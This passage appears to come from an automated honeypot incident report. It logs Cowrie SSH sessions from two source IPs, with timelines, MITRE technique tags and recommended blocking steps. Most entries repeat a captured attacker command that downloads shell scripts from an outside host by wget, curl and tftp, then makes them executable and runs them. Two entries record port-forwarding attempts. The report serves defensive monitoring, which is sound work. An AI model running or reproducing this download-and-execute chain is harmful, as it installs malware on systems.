- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b01665329f9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:12` | `cowrie.session.connect` |
| `2026-08-25 09:56:12` | `cowrie.login.success` |
| `2026-08-25 09:56:13` | `cowrie.session.params` |
| `2026-08-25 09:56:13` | `cowrie.command.input` |
| `2026-08-25 09:56:13` | `cowrie.command.success` |
| `2026-08-25 09:56:13` | `cowrie.log.closed` |
| `2026-08-25 09:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb40a1a96d84

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:13` | `cowrie.session.connect` |
| `2026-08-25 09:56:14` | `cowrie.login.success` |
| `2026-08-25 09:56:14` | `cowrie.session.params` |
| `2026-08-25 09:56:14` | `cowrie.command.input` |
| `2026-08-25 09:56:14` | `cowrie.command.success` |
| `2026-08-25 09:56:15` | `cowrie.log.closed` |
| `2026-08-25 09:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796b407b52c7

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:15` | `cowrie.session.connect` |
| `2026-08-25 09:56:15` | `cowrie.login.success` |
| `2026-08-25 09:56:16` | `cowrie.session.params` |
| `2026-08-25 09:56:16` | `cowrie.command.input` |
| `2026-08-25 09:56:16` | `cowrie.command.success` |
| `2026-08-25 09:56:16` | `cowrie.log.closed` |
| `2026-08-25 09:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4629ee9e75

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:16` | `cowrie.session.connect` |
| `2026-08-25 09:56:17` | `cowrie.login.success` |
| `2026-08-25 09:56:17` | `cowrie.session.params` |
| `2026-08-25 09:56:17` | `cowrie.command.input` |
| `2026-08-25 09:56:17` | `cowrie.command.success` |
| `2026-08-25 09:56:18` | `cowrie.log.closed` |
| `2026-08-25 09:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cd7f9f093c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:18` | `cowrie.session.connect` |
| `2026-08-25 09:56:18` | `cowrie.login.success` |
| `2026-08-25 09:56:19` | `cowrie.session.params` |
| `2026-08-25 09:56:19` | `cowrie.command.input` |
| `2026-08-25 09:56:19` | `cowrie.command.success` |
| `2026-08-25 09:56:19` | `cowrie.log.closed` |
| `2026-08-25 09:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c7a4c5fa84

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:19` | `cowrie.session.connect` |
| `2026-08-25 09:56:19` | `cowrie.client.version` |
| `2026-08-25 09:56:19` | `cowrie.client.kex` |
| `2026-08-25 09:56:20` | `cowrie.login.success` |
| `2026-08-25 09:56:21` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:56:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:56:21` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-682913d2b0b6

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:19` | `cowrie.session.connect` |
| `2026-08-25 09:56:20` | `cowrie.login.success` |
| `2026-08-25 09:56:20` | `cowrie.session.params` |
| `2026-08-25 09:56:20` | `cowrie.command.input` |
| `2026-08-25 09:56:20` | `cowrie.command.success` |
| `2026-08-25 09:56:21` | `cowrie.log.closed` |
| `2026-08-25 09:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e833694b3ac5

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:21` | `cowrie.session.connect` |
| `2026-08-25 09:56:21` | `cowrie.login.success` |
| `2026-08-25 09:56:22` | `cowrie.session.params` |
| `2026-08-25 09:56:22` | `cowrie.command.input` |
| `2026-08-25 09:56:22` | `cowrie.command.success` |
| `2026-08-25 09:56:22` | `cowrie.log.closed` |
| `2026-08-25 09:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d9ffe92d66

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:22` | `cowrie.session.connect` |
| `2026-08-25 09:56:23` | `cowrie.login.success` |
| `2026-08-25 09:56:23` | `cowrie.session.params` |
| `2026-08-25 09:56:23` | `cowrie.command.input` |
| `2026-08-25 09:56:23` | `cowrie.command.success` |
| `2026-08-25 09:56:24` | `cowrie.log.closed` |
| `2026-08-25 09:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-424af4b2c6ed

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:23` | `cowrie.session.connect` |
| `2026-08-25 09:56:23` | `cowrie.client.version` |
| `2026-08-25 09:56:23` | `cowrie.client.kex` |
| `2026-08-25 09:56:25` | `cowrie.login.success` |
| `2026-08-25 09:56:25` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:56:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:56:25` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-979b98ae879d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:24` | `cowrie.session.connect` |
| `2026-08-25 09:56:24` | `cowrie.login.success` |
| `2026-08-25 09:56:25` | `cowrie.session.params` |
| `2026-08-25 09:56:25` | `cowrie.command.input` |
| `2026-08-25 09:56:25` | `cowrie.command.success` |
| `2026-08-25 09:56:25` | `cowrie.log.closed` |
| `2026-08-25 09:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c32e9dc5b3

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:26` | `cowrie.session.connect` |
| `2026-08-25 09:56:26` | `cowrie.login.success` |
| `2026-08-25 09:56:26` | `cowrie.session.params` |
| `2026-08-25 09:56:26` | `cowrie.command.input` |
| `2026-08-25 09:56:26` | `cowrie.command.success` |
| `2026-08-25 09:56:27` | `cowrie.log.closed` |
| `2026-08-25 09:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783bad9b490f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:27` | `cowrie.session.connect` |
| `2026-08-25 09:56:27` | `cowrie.login.success` |
| `2026-08-25 09:56:28` | `cowrie.session.params` |
| `2026-08-25 09:56:28` | `cowrie.command.input` |
| `2026-08-25 09:56:28` | `cowrie.command.success` |
| `2026-08-25 09:56:28` | `cowrie.log.closed` |
| `2026-08-25 09:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b106d40ec9c2

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:29` | `cowrie.session.connect` |
| `2026-08-25 09:56:29` | `cowrie.login.success` |
| `2026-08-25 09:56:29` | `cowrie.session.params` |
| `2026-08-25 09:56:29` | `cowrie.command.input` |
| `2026-08-25 09:56:29` | `cowrie.command.success` |
| `2026-08-25 09:56:30` | `cowrie.log.closed` |
| `2026-08-25 09:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d63c42e5b9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:30` | `cowrie.session.connect` |
| `2026-08-25 09:56:30` | `cowrie.login.success` |
| `2026-08-25 09:56:31` | `cowrie.session.params` |
| `2026-08-25 09:56:31` | `cowrie.command.input` |
| `2026-08-25 09:56:31` | `cowrie.command.success` |
| `2026-08-25 09:56:31` | `cowrie.log.closed` |
| `2026-08-25 09:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a4cb5650c6

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:31` | `cowrie.session.connect` |
| `2026-08-25 09:56:32` | `cowrie.login.success` |
| `2026-08-25 09:56:32` | `cowrie.session.params` |
| `2026-08-25 09:56:32` | `cowrie.command.input` |
| `2026-08-25 09:56:32` | `cowrie.command.success` |
| `2026-08-25 09:56:33` | `cowrie.log.closed` |
| `2026-08-25 09:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f371b8e0199

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:33` | `cowrie.session.connect` |
| `2026-08-25 09:56:33` | `cowrie.login.success` |
| `2026-08-25 09:56:34` | `cowrie.session.params` |
| `2026-08-25 09:56:34` | `cowrie.command.input` |
| `2026-08-25 09:56:34` | `cowrie.command.success` |
| `2026-08-25 09:56:34` | `cowrie.log.closed` |
| `2026-08-25 09:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88875cec707

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:56 |
| **Last Seen** | 2026-08-25 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:34` | `cowrie.session.connect` |
| `2026-08-25 09:56:35` | `cowrie.login.success` |
| `2026-08-25 09:56:35` | `cowrie.session.params` |
| `2026-08-25 09:56:35` | `cowrie.command.input` |
| `2026-08-25 09:56:35` | `cowrie.command.success` |
| `2026-08-25 09:56:36` | `cowrie.log.closed` |
